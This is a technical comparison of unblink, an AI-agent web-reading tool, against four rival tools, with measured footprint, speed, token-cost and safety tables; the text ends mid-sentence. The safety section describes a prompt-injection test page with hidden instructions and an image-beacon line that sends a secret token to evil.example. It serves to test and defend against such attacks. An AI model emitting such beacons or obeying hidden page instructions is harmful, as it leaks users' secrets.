# unblink vs. other AI web-browsing tools

*Comparison as of July 2026. Every project here moves fast — versions and
numbers below will drift. Performance, memory, and token figures for **all
five tools** (plus a raw headless-Chromium baseline) are **measured locally
by one harness on identical fixtures** and reproducible with
`make crossbench` — see [Measured head-to-head](#measured-head-to-head).
Vendor-published claims survive only where our fixtures don't cover a
capability, and are labeled as such.*

Tools that give AI agents access to the web differ along two axes:

1. **What executes the page's JavaScript.** A real browser (Playwright MCP,
   Charlotte), a from-scratch engine embedding real V8 (Obscura, Lightpanda),
   or a pure-Go interpreter with a hand-rolled DOM (unblink).
2. **What the model receives.** Automation primitives over a live DOM
   (Obscura, Lightpanda), accessibility-tree snapshots (Playwright MCP), a
   typed structural decomposition (Charlotte), or reduced, token-budgeted
   Markdown (unblink).

unblink sits at the far end of both axes. It is not a browser-automation tool
that happens to speak MCP; it is a *semantic reduction* tool — fetch a page,
parse it, optionally run its JavaScript, throw away everything that exists
only for human eyes, and hand the model clean Markdown under a token budget.
An AI doesn't need pixels; it needs structured meaning. That bet buys a single
static binary with no browser install and some safety properties none of the
tools below have — and it forfeits real-browser fidelity. This document is
explicit about both directions.

## At a glance

| | **unblink** | **Playwright MCP** | **Charlotte** | **Obscura** | **Lightpanda** |
|---|---|---|---|---|---|
| Engine | Pure Go, hand-rolled DOM (no browser engine) | Real Chrome / Firefox / WebKit / Edge | Real headless Chromium (Puppeteer/CDP) | From-scratch engine in Rust | From-scratch engine in Zig |
| JavaScript | goja (Go interpreter), on by default (`--disable-js` opts out); renders React/Vue/Preact/Svelte/Lit via a flat-DOM model + a broad Web API surface (real `fetch`/Streams/`FileReader`/`crypto.subtle`; inert-but-non-throwing canvas-2D/Web Audio/WebRTC/`indexedDB`/media stubs) so pages rarely crash at boot | Full (real browser) | Full (real Chromium) | Embedded V8 (our React/Vue fixtures render; the Lit one came back empty) | Embedded V8; beta — "hundreds of Web APIs" unimplemented (though it rendered all four of our fixtures) |
| Agent protocol | MCP (stdio), 18 tools | MCP (Node), 50+ tools | MCP (Node ≥ 20), 43 tools in profiles (7/23/43) | CDP (Puppeteer/Playwright drop-in) + MCP (11 tools) | CDP (WebSocket) + MCP (stdio) + CLI agent mode |
| Page representation | Reduced Markdown (article or full page) + structured tools (outline, links, forms, JSON-LD/tables, CSS-schema extraction) | Accessibility-tree snapshots | Typed page decomposition, 3 detail levels, targeted `find` queries | DOM automation primitives (navigate/click/fill/evaluate) | DOM automation primitives; some semantic extraction |
| Screenshots / pixels | No — permanent non-goal | Yes, plus video, tracing, PDF export | Yes (real Chromium) | Not a focus | No — no graphical rendering |
| Install footprint | One static binary (linux/darwin/windows), nothing else; ~27 MB stripped, ~29 MB idle RSS ([measured](#measured-footprint)) — no embedded V8, so ~5× smaller on disk than the from-scratch engines | Node + full browser install | Node + Chromium (npm or Docker) | ~147 MB of binaries; [measured](#measured-footprint): 8 MB idle RSS, ~1 ms cold start — leaner than its own claims | ~138 MB single binary; [measured](#measured-footprint): 15 MB idle RSS, ~5 ms cold start; no native Windows, glibc-only Linux |
| Token efficiency | Core design: token-budgeted, cursor-paginated Markdown; cheap `browse`/`find` orientation. [Measured](#token-cost-per-page): reads a nav-heavy portal for ~1% of a snapshot's tokens | Verbose — [measured](#token-cost-per-page): ×86 unblink's read on a nav-heavy portal; no orientation surface | Core design: orientation 23–178× smaller than a11y-tree dumps. [Measured](#token-cost-per-page): orientation ×0.5–0.7 of unblink's `browse`; *reading* costs snapshot-scale | Not a design concern — [measured](#token-cost-per-page): its snapshot truncates at ~4 KB and never reaches the article on a nav-heavy page | Not a design concern, though its `markdown` tool is genuinely dense — [measured](#token-cost-per-page): cheapest column on small clean pages, ×67 unblink on a nav-heavy portal (no reduction, budget, or orientation) |
| Sessions | Cookies + history + persistent live JS runtime per session | Real browser profile, tabs, storage | Persistent Chromium session, stable hashed element IDs, structural diffs | Fast-boot ephemeral sessions | CDP sessions |
| Agent-safety defaults | SSRF dial guard + untrusted-content fence + origin-scoped credentials, all on by default; [measured](#content-boundary-what-reaches-the-model): only tool that strips all hidden-instruction text, fences content as untrusted, and defangs image-beacon exfiltration to inert text | — | Chromium sandbox on by default | Stealth / anti-fingerprinting, tracker blocking (secures the browser, not the content boundary; [measured](#content-boundary-what-reaches-the-model): no untrusted-content fence) | robots.txt respect, proxy support ([measured](#content-boundary-what-reaches-the-model): leaks all hidden text + a live image-beacon, no fence) |
| License | MIT | Apache-2.0 | MIT | Apache-2.0 | AGPL-3.0 |
| Maturity (07/2026) | v0.24.0 | Mature incumbent (in GitHub Copilot's coding agent) | v0.6.3 (npm) | v0.1.9 | Beta |

## The tools

### Playwright MCP

Microsoft's MCP server over Playwright: a real Chrome, Firefox, WebKit, or
Edge, exposed to the model as structured accessibility-tree snapshots rather
than screenshots. 50+ tools cover navigation, forms, tabs, network mocking,
storage, tracing, video, screenshots, PDF export, and test assertions. It is
the incumbent — GitHub Copilot's coding agent ships with it.

**Where it beats unblink:** everything that needs a real browser. Perfect
JS/CSS fidelity, real layout and geometry, screenshots and video, E2E testing
against the app you're building, sites gated by serious anti-bot
(Turnstile-class challenges unblink explicitly cannot pass). If the task is
"verify this UI change renders correctly," there is no substitute.

**What it costs:** a Node runtime plus a full browser install, the heaviest
per-page resource footprint here, and token-verbose snapshots — Playwright's
own docs steer token-sensitive workflows toward its CLI instead. Nothing in
its output model reduces a page to meaning; the model wades through the
accessibility tree itself. [Measured](#token-cost-per-page): reading a
nav-heavy portal costs ×86 unblink's reduced article, there is no cheap
orientation call, and peak memory under a page workload runs ~8× unblink's
([footprint](#measured-head-to-head)). Its per-call latency, though, is
excellent — a warm browser turns pages around in ~19 ms
([render speed](#render-speed)).

### Charlotte

The closest project to unblink in spirit, with the opposite architecture. It
keeps a persistent real headless Chromium (via Puppeteer/CDP) and puts a
token-efficiency layer on top: pages decompose into a typed structure
(landmarks, headings, interactive elements, forms) at three detail levels,
agents pull specifics with `find` queries, and element IDs are stable hashes
that survive minor DOM mutation. 43 tools, loaded in profiles so small
workflows don't pay for the full set.

**Where it beats unblink:** full Chromium fidelity under the efficient
surface — any page Chrome can run, Charlotte can represent, including
screenshots when the agent needs eyes. Its interactive-element model
(stable IDs, structural diffs) is richer for long multi-step UI driving than
unblink's selector-based `controls`/`interact`.

**What it costs:** the Chromium dependency (Node ≥ 20 plus a browser, or a
Docker image) and Chromium's memory profile per session. It optimizes what
the *model* pays per page, not what the *host* pays to run the browser. Young
project (v0.6.3 on npm). [Measured](#token-cost-per-page): the efficiency
layer earns its keep on *orientation* (×0.5–0.7 of unblink's `browse`, far below a
raw snapshot) — but actually *reading* a page's prose requires its `full`
detail level, which costs about what a Playwright snapshot costs (its
`summary` level truncates article text; sentinel-verified by the harness).

### Obscura

A from-scratch headless browser in Rust with V8 embedded, positioned as a
drop-in replacement for headless Chrome: existing Puppeteer/Playwright
scripts work over CDP, and an MCP server exposes 11 automation tools
(`browser_navigate`, `browser_click`, `browser_fill`, `browser_evaluate`,
`browser_wait_for`, …). Claims 30 MB memory and sub-50 ms session boot versus
200+ MB and seconds for headless Chrome — [measured](#measured-footprint),
it beats its own claims: 8 MB idle PSS and a ~1 ms cold start, the leanest and
fastest-booting column in the harness. Also ships a `--stealth` mode
(per-session fingerprint randomization, ~3,520 tracker domains blocked).

**Where it beats unblink:** real V8 means real-world JS compatibility beyond
what goja reaches, at a footprint far below Chrome's; CDP compatibility means
the whole Puppeteer/Playwright ecosystem just works; stealth tooling for
scraping-adjacent work is a first-class feature unblink deliberately keeps
minimal (`--tls-mimic` is best-effort, and evading bot detection is not a
goal).

**What it costs:** it hands the agent a browser, not meaning — the model gets
automation primitives and raw DOM access, and token-efficient representation
is its problem. [Measured](#token-cost-per-page): its `browser_snapshot`
hard-truncates at ~4 KB with no continuation mechanism, so on a nav-heavy
portal the article never makes it into the output at all, and on a long read
the one-shot buys only the first half of the text; the whole document takes
`browser_markdown` with an explicit size cap. There is no orientation
surface, and no content-boundary hardening — [measured](#content-boundary-what-reaches-the-model),
it passes all three hidden-instruction blocks straight to the model, emits a
live image-beacon URL through its `browser_markdown` read, and returns the raw
byte stream on a PDF. Very early (v0.1.9) — our React and Vue fixtures
rendered, the Lit one came back empty ([render speed](#render-speed)).

### Lightpanda

A ground-up browser engine in Zig with V8, aimed at headless automation and
AI agents — no Chromium, no WebKit, no graphical rendering. Speaks CDP over
WebSocket (Puppeteer/Playwright compatible), MCP over stdio, and has a CLI
agent mode. Claims ~16× less memory and ~9× faster than headless Chrome on
its 100-page benchmark — [measured](#measured-footprint) here at 15 MB idle
(~10× under the raw Chromium baseline) with 1–11 ms page turnaround, so the
direction of the claim holds.

**Where it beats unblink:** real V8 compatibility and the CDP ecosystem, like
Obscura, in a single binary. It rendered all four of our fixtures — including
the SPAs, at 3–11 ms each, the fastest render column in the harness
([render speed](#render-speed)) — and its `markdown` tool is the cheapest
read on small clean pages. Its trajectory is "Chrome-class engine without
Chrome's weight," which covers automation use cases unblink never will.

**What it costs:** it is explicitly beta — hundreds of Web APIs
unimplemented, some sites still crash — so today its practical coverage of
the JS web is a moving target, much like unblink's flat-DOM model but without
the static-reduction fallback unblink leans on when JS isn't needed. And its
`markdown` is *rendering*, not reduction: no article extraction, token
budget, pagination, or orientation surface, so a nav-heavy portal costs ×67
unblink's read ([token cost](#token-cost-per-page)), and — like Obscura — no
content-boundary hardening ([measured](#content-boundary-what-reaches-the-model):
all hidden text and a live image-beacon pass through, and PDFs come back
empty). Platform constraints (no native Windows, glibc-only Linux) and
AGPL-3.0 licensing may matter for embedding.

## How unblink differs

unblink refuses the premise the other four share: that an agent needs a
browser. Its pipeline — fetch, parse HTML5, optionally execute JS against a
hand-rolled DOM, reduce, emit Markdown — never computes a pixel. That single
decision drives everything distinctive about it, good and bad.

**What the bet buys:**

- **Zero-dependency deployment.** One static pure-Go binary (no cgo, no
  Chromium, no Node, no V8) cross-compiled for linux/darwin/windows on
  amd64/arm64. There is nothing to install next to it and no browser process
  to babysit.
- **Meaning, not markup.** `read` returns reduced, sanitized Markdown under
  an explicit token budget with cursor pagination — never an unbounded blob.
  `browse` gives a ~free orientation pass; `find`, `links`, `forms`, `data`
  (JSON-LD / tables / microdata) answer questions without shipping the page.
  PDFs, RSS/Atom/JSON feeds, and images are handled transparently by the same
  `read` tool.
- **Agent-trust hardening no one else has.** Returned content is treated as
  untrusted *by the model*: wrapped in a provenance fence so it reads as data
  rather than instructions, human-hidden text stripped, Markdown image
  beacons (a zero-click exfiltration channel) defanged — on by default.
  Every fetch, including page-JS subrequests, sits behind an SSRF dial guard
  checked against resolved IPs. Credentials are origin-pinned and stripped on
  any cross-origin redirect. The other tools secure the *browser*; unblink
  also hardens the *content boundary* between the web and the model.
- **Discovery built in.** `map` (sitemap harvest + bounded same-origin
  crawl), `site` (robots.txt/llms.txt surfaced as context; enforced only with `--respect-robots`),
  and opt-in `search` make it a research tool, not only a page loader.
- **Optional real ad-blocking (ADR 0010).** unblink can runtime-load a
  WebExtension — uBlock Origin Lite is verified working: its 18,249
  `declarativeNetRequest` rules compile into unblink's own host matcher and block
  real ad/tracker requests (network filtering), while cosmetic rules strip ad
  markup from the reduced Markdown (no CSSOM, so `display:none` becomes node
  removal). No extension bytes are vendored — GPL tooling stays out of the MIT
  tree. That puts unblink in the same tracker-blocking territory as Obscura's
  `--stealth` and Lightpanda's tracker respect, but as a real extension the
  operator supplies rather than a built-in list.

**What it forfeits:**

- **JS compatibility has a ceiling — but a higher one than you'd expect.** goja
  is not V8, yet the flat-DOM model renders mainstream React/Vue/Preact/Svelte/Lit
  apps — including an encapsulating, composed Shadow DOM (slot distribution +
  cross-boundary events, Phase 23) — and the broad Web API surface (Phases 24–26)
  is present, so pages rarely crash at boot: `fetch`/Streams/`FileReader`, a real
  `crypto.subtle` (digest/HMAC/AES/PBKDF2, backed by Go's `crypto`), an in-memory
  `indexedDB`, and inert-but-non-throwing stubs for canvas-2D, Web Audio, WebRTC,
  media playback, and the device APIs. What stays forfeit is anything that needs
  **pixels or a second thread**: real layout/geometry (`getBoundingClientRect` and
  friends are zeros), canvas/WebGL/WebGPU *rendering* (the 2D context accepts every
  call and draws nothing), real Workers / WebSocket / persistent storage, and
  Shadow-DOM *style scoping* (`:host`/`::slotted`/`::part`). A page whose *content*
  lives in those — a WebGL globe, a canvas-only chart — still won't materialize; a
  page that merely *touches* them during boot now renders fine.
- **No pixels, ever.** No screenshots, no visual verification, no "does this
  look right" — by design.
- **An anti-bot ceiling.** `--tls-mimic` gets past naive fingerprint checks
  and the engine clears trivial JS interstitials, but Turnstile-class
  interactive challenges and server-side proof-of-work are out of scope.

## Which tool when

- **Screenshots, E2E testing, pixel-perfect fidelity, hostile anti-bot** →
  Playwright MCP. It's a real browser; nothing else here is.
- **Real-Chromium coverage with a token-efficient agent surface** →
  Charlotte. Chromium fidelity underneath, structured economy on top.
- **A low-footprint CDP drop-in for existing Puppeteer/Playwright automation**
  → Obscura (or Lightpanda, accepting beta coverage and AGPL). Real V8
  without Chrome's weight.
- **Reading, extracting, and researching the web for a model at minimal
  token cost, footprint, and attack surface** → unblink. Content for
  reasoning, not automation fidelity.

These compose: an agent can use unblink for the hundred pages it reads and a
real browser for the one page it must drive or see.

## Measured head-to-head

Every tool below is driven the way a real agent drives it — spawned as an MCP
server over stdio, the `initialize` handshake timed, then `tools/call` —
through **identical local fixtures**: a static article, real React / Vue / Lit
SPAs, and three static token-metric pages (a junk-laden article, a long read,
and a generated ~90 KB nav-heavy portal). Playwright MCP and Charlotte drive
the **same Chromium binary** as the raw chromedp baseline, at their default
settings and pinned versions; Obscura and Lightpanda are their own engines
(that's the point of them). Memory is **PSS** (proportional set size —
shared pages counted once) summed over each tool's whole process tree, so a
multi-process browser isn't double-counted. Every counted output is
**sentinel-validated** — a tool result missing the fixture's known content
(and, for whole-document reads, its document-tail content) prints as `fail`,
never as a number, so an error message or a silent truncation can't
masquerade as efficiency. Reproduce with `make crossbench` (see
[`scripts/membench`](../scripts/membench), a separate module so its
dependencies never touch the published binary).

Full head-to-head measured 2026-07-06 · WSL2 (Linux 6.6, 4 vCPU / 5.8 GiB) ·
Chromium 140.0.7339.16 · @playwright/mcp 0.0.77 (Playwright 1.62.0-alpha) ·
charlotte 0.6.3 · obscura 0.1.9 · lightpanda nightly 1.0.0-7742 · median of 3
runs. **All six columns were re-measured together on this one machine at unblink
0.24.0** — every tool was installed and driven live (Chromium via the Playwright
cache, obscura and lightpanda from their release binaries), so there are no
carried columns and the whole table is one internally-consistent snapshot.
Run-to-run footprint variance is real (PSS depends on allocator and kernel
state), so read these as the right order of magnitude, not to the megabyte.

Every tool runs at its defaults, and as of this date that is clean
like-for-like: unblink's per-host politeness limiter is now opt-in
(`--rate-limit`, default off), matching the other tools, none of which ships a
crawl limiter. Latency and throughput numbers published before this date are
not comparable — the limiter then defaulted to 5 req/s, and against this
harness's single loopback host with cache-busted URLs every SPA latency
median collapsed to token pacing (~200 ms/request) and sequential throughput
pinned at exactly 5 pages/s: those rows measured the crawl policy, not the
engine.

### Measured footprint

| Metric | unblink | Chromium (headless) | Playwright MCP | Charlotte | Obscura | Lightpanda |
|---|---|---|---|---|---|---|
| Binary on disk | 27 MB⁴ | 439 MB | npx pkg + Chromium | npx pkg + Chromium | 147 MB | 138 MB |
| Cold start → MCP ready | 18 ms | 150 ms¹ | 482 ms | 517 ms | 1 ms | 5 ms |
| First page ready | ~1 ms | 188 ms | 167 ms | 200 ms | 9 ms | ~1 ms |
| Idle RSS (post-init) | 29 MB | 149 MB | 149 MB | 125 MB | 8 MB | 15 MB |
| Peak RSS (sequential renders) | 44 MB | 180 MB | 339 MB | 309 MB | 10 MB | 16 MB |
| Peak RSS (8 concurrent) | 45 MB | 278 MB | n/a² | n/a² | n/a² | n/a² |
| Fixtures fully rendered (of 4) | 4 | 4 | 4 | 4 | 3³ | 4 |

¹ the raw baseline's "ready" is a blank CDP target, not an MCP handshake.
² one browsing context per server — pipelined navigations would corrupt each
other, so no number is reported; unblink dispatches concurrent MCP requests on
a single stdio connection, the raw baseline opens tabs.
³ the Lit fixture navigated but produced no content (custom-element /
Shadow-DOM gap); React and Vue rendered.
⁴ the stripped release artifact a user downloads (goreleaser builds with
`CGO_ENABLED=0 -ldflags "-s -w"`), measured like-for-like with obscura's and
lightpanda's shipped release binaries. That unblink is **~5× smaller than the
from-scratch V8 engines and ~16× smaller than Chromium** is the no-V8 bet made
visible: goja is the interpreter, so there is no embedded V8 to carry.

Three readings. **Against the browser-backed tools**, unblink's pitch holds:
it answers its first read in ~19 ms total while they pay ~0.5 s of Node+MCP
start plus ~200 ms of browser/tab work (npx cache warm; package download
excluded), idles at ~a fifth of their footprint, and peaks at ~44 MB against
their ~309–339 MB — serializing a11y trees or typed decompositions on top of
the browser costs real memory above even the raw baseline's 180 MB.
**Against the from-scratch engines, the picture splits by metric.** On *disk*
unblink is the smallest by far — a 27 MB stripped binary against Obscura's
147 MB and Lightpanda's 138 MB, because it embeds no V8 (footnote ⁴). On *idle
RAM* it no longer holds the floor: an idle Obscura is 8 MB and Lightpanda 15 MB,
both under unblink's 29 MB, and both cold-start faster. Their bet (rebuild the
browser smaller) and unblink's (don't ship a browser at all) land in the same
runtime weight class; what separates them is what the model receives — see the
[token table](#token-cost-per-page) — and unblink's content-boundary
hardening. **Under load**, all three lightweight engines stay flat (10–44 MB
peaks), and unblink holds its ~45 MB even at 8-way concurrency because each
render's goja heap is bounded and torn down after the snapshot.

### Render speed

Per-call latency, URL → that tool's page-ready output, on a cache-missed URL
each iteration. Each column uses the tool's **own readiness definition**:
unblink's number is the full `read` (fetch, parse, JS render, semantic
reduction, Markdown emit) with its two-tier settle — a page whose scripts
leave nothing armed is *provably* idle (no in-flight network, no live timers;
ADR 0004) and settles in ~1 ms, while anything armed pays a 60 ms quiet
window after its last activity. The raw Chromium baseline opens a fresh tab
and keeps its fixed 60 ms settle window (CDP exposes no equivalent idle
proof, so its column carries that flat cost); the MCP browser tools navigate
a warm tab and serialize at their defaults (load event, no settle — content
presence on these fixtures is sentinel-verified).

| Page | unblink | Chromium (headless) | Playwright MCP | Charlotte | Obscura | Lightpanda |
|---|---|---|---|---|---|---|
| Static / server-rendered article | <1 ms | ~95 ms | ~16 ms | ~11 ms | ~4 ms | ~1 ms |
| React SPA render | ~9 ms | ~101 ms | ~19 ms | ~16 ms | ~12 ms | ~8 ms |
| Vue SPA render | ~3 ms | ~102 ms | ~20 ms | ~16 ms | ~13 ms | ~11 ms |
| Lit SPA render | ~3 ms | ~100 ms | ~18 ms | ~13 ms | (~5 ms)¹ | ~3 ms |
| Throughput (mixed corpus, sequential) | ~234 pages/s | ~10 pages/s | ~52 pages/s | ~72 pages/s | ~119 pages/s | ~165 pages/s |
| Throughput (mixed corpus, 8 concurrent) | ~795 pages/s | ~47 pages/s | n/a² | n/a² | n/a² | n/a² |

¹ call timing only — Obscura's Lit output carried no content (see footprint
table), so this is not a comparable render.
² single browsing context per server — pipelined navigations would corrupt
each other; unblink dispatches concurrent MCP requests on one stdio
connection, the raw baseline opens tabs.

This table looked very different before 2026-07-03, for two reasons worth
being explicit about. First, the harness was pacing unblink against its own
politeness limiter (see the provenance note above) — the old ~200 ms SPA
medians measured a crawl policy. Second, the engine's fixed settle floor is
gone: the settle now *proves* idleness (nothing in flight, nothing armed —
every async source is instrumented, ADR 0004) instead of always waiting out a
60 ms quiet window, initial script bodies prefetch concurrently, and compiled
bundles are cached by content. The result: unblink turns these SPA fixtures
around in ~3–9 ms — ahead of the warm browsers (~13–20 ms) and level with
the embedded-V8 engines (~3–13 ms) — while remaining the only column that
builds and tears down an isolated runtime per render. The honest caveat is
that goja is still a tree-walking interpreter: the ~9 ms React number is
dominated by executing react-dom, and a much heavier bundle widens that gap
against real V8 — the fixtures here are moderate SPAs, not sprawling ones.
Throughput compounds the per-call story with concurrency: ~234 pages/s
sequential and ~795 pages/s at 8-way on the mixed corpus, with peak RSS held
at 45 MB (previous table) because each render's heap is bounded and torn down
after the snapshot. The full picture still pairs this table with the next
one: a page an agent reads costs latency *once* but tokens *every time the
model re-reads its context*.

### Token cost per page

What the agent's context window pays, per abstract task, counted with an
offline o200k_base BPE tokenizer (raw bytes alongside — Claude's tokenizer is
not public, but ratios are stable across modern BPE tokenizers). Tasks:
`read-article` is each tool's canonical way to put the page's content in
front of the model (unblink: default article-mode `read`; Playwright and
Obscura: navigate + snapshot; Charlotte: navigate at `full` detail — its
`summary` level truncates prose, sentinel-verified; Lightpanda: its
`markdown` tool); `read-full` retrieves the *whole* document, tail-verified
(unblink follows its pagination cursors to exhaustion, Obscura needs
`browser_markdown` with an explicit size cap — each tool's documented
continuation mechanism — so a budget cap or silent truncation can't
masquerade as efficiency); `orient` is the cheapest "what's on this page"
call. The three token fixtures are static pages, so JS-coverage differences
can't distort the metric.

| Task · fixture | unblink | Playwright MCP | Charlotte | Obscura | Lightpanda |
|---|---|---|---|---|---|
| read-article · junky article | 377 (1.8 KB) | 952 (3.5 KB) ×2.5 | 1,048 (3.8 KB) ×2.8 | 534 (2.4 KB) ×1.4 | 455 (2.1 KB) ×1.2 |
| read-article · long read | 1,554 (7.6 KB) | 2,080 (9.0 KB) ×1.3 | 1,952 (8.7 KB) ×1.3 | 907 (4.1 KB) ×0.6¹ | 1,503 (7.4 KB) ×1.0 |
| read-article · nav-heavy portal | **303 (1.4 KB)** | 26,182 (92.0 KB) ×86 | 27,164 (89.8 KB) ×90 | fail¹ | 20,328 (63.4 KB) ×67 |
| read-full · junky article | 538 (2.4 KB) | 952 ×1.8 | 1,048 ×1.9 | 497 ×0.9 | 455 ×0.8 |
| read-full · long read | 1,583 (7.7 KB) | 2,080 ×1.3 | 1,952 ×1.2 | 1,710 ×1.1 | 1,503 ×1.0 |
| read-full · nav-heavy portal | 15,286 (48.9 KB, 3 calls) | 26,182 ×1.7 | 27,164 ×1.8 | 11,865 ×0.8 | 20,328 ×1.3 |
| orient · junky article | 528 (1.6 KB) | n/a | 379 ×0.7 | n/a | n/a |
| orient · long read | 792 (2.4 KB) | n/a | 436 ×0.6 | n/a | n/a |
| orient · nav-heavy portal | 1,435 (4.3 KB) | n/a | 745 ×0.5 | n/a | n/a |

¹ Obscura's `browser_snapshot` hard-truncates at ~4 KB. On the long read the
cut lands mid-article, so its ×0.6 one-shot buys roughly the *first half* of
the text — the read-full row is its complete-document cost. On the nav-heavy
portal the first 4 KB is all navigation junk and the article never appears,
so the read fails outright.

**On the `orient` rows:** unblink's `browse` now costs 528 / 792 / 1,435 tokens
(was ~270 / 339 / 369 at v0.17.1) because it no longer returns a bare excerpt — it
returns a structured decomposition: a landmark/region map, ARIA-annotated controls,
a unified `metadata` object, a deep-linkable heading outline, and ready-to-use
`extract` schemas (all added v0.20.0–v0.21.0). That is a few hundred tokens for a far
more actionable orientation, still one to two orders of magnitude under any full-page
read. Charlotte's orientation is leaner (×0.5–0.7 of unblink's here), the trade being
it carries less structure per call. (Charlotte's column, like every other, is from the
2026-07-06 run in which all columns were re-measured together — see the
[provenance note](#measured-head-to-head).)

The shape of the result: on a **clean long-form page** everyone lands within
~1.3× of everyone — there is little junk to strip, and every representation
carries the same prose. On a **nav-heavy portal** — mega-menus, footers,
trending rails, the shape of most commercial pages — semantic reduction is
worth **~two orders of magnitude**: 303 tokens for the article vs. ~20–27k
for any full-page representation, *including Lightpanda's Markdown* (×67) —
rendering a page as Markdown is not the same as reducing it to the part
worth reading. Even unblink's *cursor-exhausted whole page* costs ~1.7× less
than a snapshot, because Markdown with duplicate-block suppression is a
denser encoding than an a11y tree. Playwright MCP, Obscura, and Lightpanda
have **no orientation surface** — a full-page representation is the only
representation. Charlotte's orientation is genuinely cheap (its design goal,
delivered), but *reading* prose through it costs snapshot-scale tokens. And
where there's nothing to strip, the from-scratch engines undercut unblink —
×0.8–0.9 on the junky article's full read above, down to ×0.2–0.5 for
Lightpanda on the tiny SPA fixtures (not shown): unblink's provenance fence
and pagination footer are a fixed overhead that only pays for itself once
pages carry junk worth stripping, which most commercial pages do.

**Honest caveats.** This is not a like-for-like capability comparison — the
browser columns do full layout, paint, and real-DOM interaction (and can
screenshot); a Playwright snapshot and an Obscura/Lightpanda DOM carry
interaction affordances (element refs) unblink's Markdown doesn't; Charlotte
was measured at the detail levels its own schema recommends for each task.
The from-scratch engines are early (Obscura v0.1.9, Lightpanda beta), so
their columns describe today's builds, not their trajectories. The numbers
are machine-specific and reflect these fixtures, not the whole web. They are
the floor of what a real browser costs, not a claim that unblink *replaces*
one — see [Which tool when](#which-tool-when).

### Content boundary (what reaches the model)

Footprint and tokens are cost metrics; this one is a *safety* metric. Every
other tool secures the *browser* (sandbox, stealth, tracker blocking); unblink
also hardens the boundary between untrusted web content and the model. To make
that concrete rather than asserted, `make crossbench ARGS="-safety"` drives each
tool's `read-article` against a fixture page that carries three
hidden-instruction blocks — a `display:none` div, an `aria-hidden` span, and
an off-screen (`left:-9999px`) div, each with a distinct marker — plus an image
whose URL smuggles a secret:
`<img src="https://evil.example/beacon.png?leak=SECRET-TOKEN-42">`. That image
is a real zero-click exfiltration channel: a client that auto-renders a
Markdown `![](url)` fetches the URL, and the secret leaves with the request.
Reading that page (and a one-page PDF) through each tool's read surface:

| Behavior | unblink | Playwright MCP | Charlotte | Obscura | Lightpanda |
|---|---|---|---|---|---|
| Hidden-instruction blocks leaked (of 3) | **0** | 2 | 1 | 3 | 3 |
| Image-beacon exfiltration URL | **defanged**¹ | dropped | dropped | dropped² | live `![](url)` |
| Output fenced as untrusted | **yes** | no | no | no | no |
| One-page PDF | **clean text** | other³ | other³ | raw `%PDF` bytes² | empty |

¹ unblink alone rewrites the image to inert text `[image: … — url]`: the URL
stays *visible* as data (auditable) but a client won't auto-fetch it. The
others that show "dropped" simply omit the image from their structured/plain
read; Lightpanda's Markdown emits it live.
² measured on Obscura's plain-text snapshot; its `browser_markdown` (the
token-dense read it recommends) instead emits the beacon **live** and dumps the
raw PDF bytes.
³ navigating a browser tool to a PDF yields neither extracted text nor raw
bytes — a viewer/download shell the model can't read as content.

Three properties set unblink apart. **It strips all three hidden-instruction
blocks** where the others leak one to three: the raw DOM dumps (Obscura,
Lightpanda) pass all three through, and the structured surfaces (Playwright's
a11y tree, Charlotte's decomposition) still leak one or two. **It is the only
tool that fences its output** as untrusted data — an `[UNTRUSTED WEB CONTENT …]`
wrapper with a random marker, so injected imperatives read as data, not
instructions, *regardless of what slipped past extraction*. And **it is the only
tool that turns the PDF into readable text** (the others render what a browser
renders; unblink fetches and parses, so PDFs, feeds, and images go through the
same `read`).

That clean sweep on hidden text is recent, and worth being honest about how it
got there: the probe first caught unblink leaking the off-screen block through
its *default article* read (`display:none`/`aria-hidden` were always stripped,
and `mode:"full"` stripped all three, but readability dropped the off-screen
element's inline style before the strip ran). That's now fixed — the strip runs
before extraction too — which is exactly what a regression harness is for. Even
so, hidden-text filtering is a heuristic on every tool here; what makes unblink's
posture structurally different is that the fence backstops anything that ever
does slip through, and the beacon is defanged to auditable text rather than
dropped or fired.

This is the crux of the differentiation. Obscura and Lightpanda are lean
real-browser *automation* engines — richer interaction surfaces than unblink
(multi-tab, storage-state replay, stealth) and real V8. (Caller-directed
CSS-schema extraction, once one of their differentiators, is now covered by
unblink's `extract` tool — and schema *discovery* is self-serve: `browse`
auto-detects a page's repeating record-sets and hands the agent a ready-to-use
`{root, fields}` schema, so it never has to fetch raw HTML to find selectors.)
They compete with Playwright MCP, a lighter CDP drop-in. unblink competes on
the content boundary itself: reduce the page to meaning, treat what crosses into
the model as untrusted, and cover the non-HTML web — the things a faithful DOM,
by construction, does not do.

## Real-page corpus: unblink vs Charlotte

The tables above are small local fixtures. This one is real pages: the
[real-page corpus](corpus.md) — 74 captured public pages across frameworks,
hydration styles and page shapes — read by unblink and by Charlotte, offline,
with both outputs scored against what headless Chromium rendered at capture
time. Charlotte is the closest comparison in this document: the same job
(hand an agent a page's content cheaply), done the other way (a real Chromium
under a token-efficiency layer). Reproduce with `make corpus-compare`; how it
works, and every rule below, is in
[corpus.md](corpus.md#comparing-against-another-tool-make-corpus-compare).

Measured 2026-11-27 · WSL2 (Linux 6.6, 32 vCPU / 23.5 GiB) · unblink
v0.25.0-21-g1ce651f (the `fix/render-terminate-hang` stack tip) · charlotte
0.6.3 on Node 25.0.0 · Google Chrome for Testing 151.0.7922.34, the build
that made the captures · 74 captured pages, 72 with a usable oracle, 67
replay-sound for both tools · 3 runs per page per configuration, medians
reported · tokens are o200k_base.

**Read this first.** The oracle is Chromium's `innerText`, and Charlotte *is*
Chromium reading that same DOM. On anything decided by layout, or by
JavaScript unblink's engine cannot run, Charlotte starts ahead by
construction and a tie is the best unblink can do. unblink starts ahead on
tokens for the mirror-image reason: it reduces, Charlotte serialises a typed
tree. So the result below is the expected shape — Charlotte ahead on fidelity,
unblink ahead on cost — and what the numbers add is *how much* of each.

Further caveats, none of them tuned away:

- **Different routes to the same bytes.** Charlotte's Chromium is served the
  capture through a replay proxy; unblink runs as an in-process MCP server
  with the capture as its transport. Same matcher, no network for either, but
  unblink is spared a loopback TLS hop and a process start, so **latency is
  the least comparable column**.
- **Viewport.** Charlotte's default viewport is 1440×900; the captures were
  made at 1280×720. A wider viewport prefetches and lays out differently.
- **When each tool reads.** Charlotte reads at the `load` event; unblink waits
  for the network and timers to settle. Content that arrives after `load`
  favours unblink, content that needs layout favours Charlotte.
- **Charlotte's cost excludes replay artefacts.** Its payload reports console
  errors, and under replay those are mostly the replay's own (fonts are not
  stored in a capture, so Chromium logs a decode failure per use). The token
  columns count the payload with that block emptied; "tokens as returned" is
  the unadjusted figure.
- **A JSON payload, scored as text.** Charlotte's fidelity is scored on its
